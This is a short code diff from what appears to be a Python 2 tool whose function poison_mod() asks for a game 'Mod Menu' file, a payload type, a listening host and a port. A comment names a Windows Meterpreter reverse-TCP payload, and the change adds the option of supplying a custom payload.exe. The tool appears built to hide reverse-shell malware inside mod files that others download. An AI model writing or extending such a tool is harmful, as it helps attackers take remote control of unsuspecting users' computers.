@@ -19,7 +19,7 @@ def poison_mod():
     input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))
 
     # payload_Generate = 'windows/meterpreter_reverse_tcp'
-    payload_Generate = str(raw_input("Enter the type of payload you want to use: "))
+    payload_Generate = str(raw_input("Enter the type of payload you want to use (or $PATH/payload.exe): "))
     # LHOST = '8.8.8.8'
     LHOST = str(raw_input("Enter Listening Host: "))
     # LPORT = '443'
